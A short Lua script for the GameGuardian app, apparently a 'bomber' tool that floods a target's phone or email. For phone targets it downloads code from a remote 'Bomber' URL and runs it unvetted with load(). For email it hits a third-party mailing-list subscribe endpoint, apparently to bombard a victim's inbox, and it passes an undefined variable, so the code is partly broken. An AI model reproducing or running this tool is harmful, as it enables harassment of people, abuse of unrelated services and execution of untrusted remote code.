function start()
sc = gg.choice({
	"Phone",
	"Email",
},nil,"By Fixxel")
if sc == 1 then Phone() end
if sc == 2 then Email() end
end

function Phone()
Ph=gg.prompt({"Phone (without +)"})
TG = gg.makeRequest("https://fixxel.tk/Lua/Bomber/phone.lua").content
if not TG then
gg.alert("Need Internet Connection!")
os.exit()
else﻿
pcall(load(TG))
end﻿
end

function Email()
ZZ = gg.makeRequest("https://coral.aoml.noaa.gov/mailman/subscribe/cdhc?email=",zalupa).content
if not ZZ then
gg.alert("Need Internet Connection!")
os.exit()
else﻿
pcall(load(ZZ))
end﻿
end

while(true) do 
menuend = 0 
if gg.isVisible(true) then 
gg.setVisible(false) 
menuend=1 
if menuend==1 then start() end 
end end
